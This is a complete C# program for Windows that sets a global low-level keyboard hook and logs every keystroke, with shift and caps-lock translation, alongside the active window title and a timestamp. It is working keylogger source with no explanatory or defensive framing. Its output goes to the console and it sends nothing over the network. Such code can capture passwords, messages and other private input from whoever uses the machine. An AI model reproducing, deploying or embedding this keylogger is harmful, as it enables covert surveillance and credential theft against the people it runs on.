using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Windows.Input;

class Action
{
    #region vars
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc proc = HookCallback;
    private static IntPtr hookID = IntPtr.Zero;
    private static string oldWindow = "";
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    #endregion
    #region imports
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    #endregion

    [STAThread]
    static void Main(string[] args)
    {
        hookID = SetHook(proc);
        Application.Run();
        UnhookWindowsHookEx(hookID);
    }
    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        var window = GetActiveWindowTitle();
        if(window != oldWindow)
        {
            Console.WriteLine("\r\n");
            oldWindow = window;
            Console.WriteLine("\r\n" + DateTime.Now + "\r\n" + window + "\r\n--------------------------");
        }
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            switch ((Keys)vkCode)
            {
                case Keys.Add:
                    Console.Write("[Add]");
                    break;
                case Keys.Attn:
                    Console.Write("[Attn]");
                    break;
                case Keys.Clear:
                    Console.Write("[Clear]");
                    break;
                case Keys.Down:
                    Console.Write("[Down Arrow]");
                    break;
                case Keys.Up:
                    Console.Write("[Up Arrow]");
                    break;
                case Keys.Left:
                    Console.Write("[Left Arrow]");
                    break;
                case Keys.Right:
                    Console.Write("[Right Arrow]");
                    break;
                case Keys.Escape:
                    Console.Write("[ESC]");
                    break;
                case Keys.Tab:
                    Console.Write("[Tab]");
                    break;
                case Keys.LWin:
                    Console.Write("[LeftWinKey]");
                    break;
                case Keys.RWin:
                    Console.Write("[RightWinKey]");
                    break;
                case Keys.PrintScreen:
                    Console.Write("[PrtScrn]");
                    break;
                case Keys.D0:
                    if (isShift()){Console.Write(")");}
                    else{Console.Write("0");}
                    break;
                case Keys.D1:
                    if (isShift()){Console.Write("!");}
                    else{Console.Write("1");}
                    break;
                case Keys.D2:
                    if (isShift()){Console.Write("@");}
                    else{Console.Write("2");}
                    break;
                case Keys.D3:
                    if (isShift()){Console.Write("#");}
                    else{Console.Write("3");}
                    break;
                case Keys.D4:
                    if (isShift()){Console.Write("$");}
                    else{Console.Write("4");}
                    break;
                case Keys.D5:
                    if (isShift()){Console.Write("%");}
                    else{Console.Write("5");}
                    break;
                case Keys.D6:
                    if (isShift()){Console.Write("^");}
                    else{Console.Write("6");}
                    break;
                case Keys.D7:
                    if (isShift()){Console.Write("&");}
                    else{Console.Write("7");}
                    break;
                case Keys.D8:
                    if (isShift()){Console.Write("*");}
                    else{Console.Write("8");}
                    break;
                case Keys.D9:
                    if (isShift()){Console.Write("(");}
                    else{Console.Write("9");}
                    break;
                case Keys.Space:
                    Console.Write(" ");
                    break;
                case Keys.NumLock:
                    Console.Write("[NumLock]");
                    break;
                case Keys.Alt:
                    Console.Write("[Alt]");
                    break;
                case Keys.LControlKey:
                    Console.Write("[LeftControl]");
                    break;
                case Keys.RControlKey:
                    Console.Write("[RightControl]");
                    break;
                case Keys.CapsLock:
                    Console.Write("[CapsLock]");
                    break;
                case Keys.Delete:
                    Console.Write("[Delete]");
                    break;
                case Keys.Enter:
                    Console.WriteLine("[Enter]");
                    break;
                case Keys.OemSemicolon:
                    if (isShift()){Console.Write(":");}
                    else{Console.Write(";");}
                    break;
                case Keys.Oemtilde:
                    if (isShift()){Console.Write("~");}
                    else{Console.Write("`");}
                    break;
                case Keys.Oemplus:
                    if (isShift()){Console.Write("+");}
                    else{Console.Write("=");}
                    break;
                case Keys.OemMinus:
                    if (isShift()){Console.Write("_");}
                    else{Console.Write("-");}
                    break;
                case Keys.Oemcomma:
                    if (isShift()){Console.Write("<");}
                    else{Console.Write(",");}
                    break;
                case Keys.OemPeriod:
                    if (isShift()){Console.Write(">");}
                    else{Console.Write(".");}
                    break;
                case Keys.OemQuestion:
                    if (isShift()){Console.Write("?");}
                    else{Console.Write("/");}
                    break;
                case Keys.OemPipe:
                    if (isShift()){Console.Write("|");}
                    else{Console.Write("\\");}
                    break;
                case Keys.OemQuotes:
                    if(isShift()){Console.Write("\"");}
                    else{Console.Write("'");}
                    break;
                case Keys.OemCloseBrackets:
                    if (isShift()){Console.Write("]");}
                    else{Console.Write("}");}
                    break;
                case Keys.OemOpenBrackets:
                    if (isShift()){Console.Write("[");}
                    else{Console.Write("{");}
                    break;
                case Keys.Back:
                    Console.Write("[Backspace]");
                    break;
                default:
                    Keys t = (Keys)vkCode;
                    var isCapslock = Keyboard.IsKeyToggled(Key.CapsLock);
                    if (isCapslock && isShift()){Console.Write(t.ToString().ToLower());}
                    else if (isCapslock && !isShift()){Console.Write(t.ToString());}
                    else if (!isCapslock && isShift()){Console.Write(t.ToString());}
                    else{Console.Write(t.ToString().ToLower());}
                    break;
            }
            if ((Keys)vkCode == Keys.PrintScreen)
            {
                Console.WriteLine("PrintScreen");
            }
        }
        return CallNextHookEx(hookID, nCode, wParam, lParam);
    }
    static string GetActiveWindowTitle()
    {
        const int nChars = 256;
        StringBuilder Buff = new StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();

        if (GetWindowText(handle, Buff, nChars) > 0)
        {
            return Buff.ToString();
        }
        return null;
    }
    static bool isShift()
    {
        if (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)){
            return true;
        }
        else
        {
            return false;
        }
    }
}
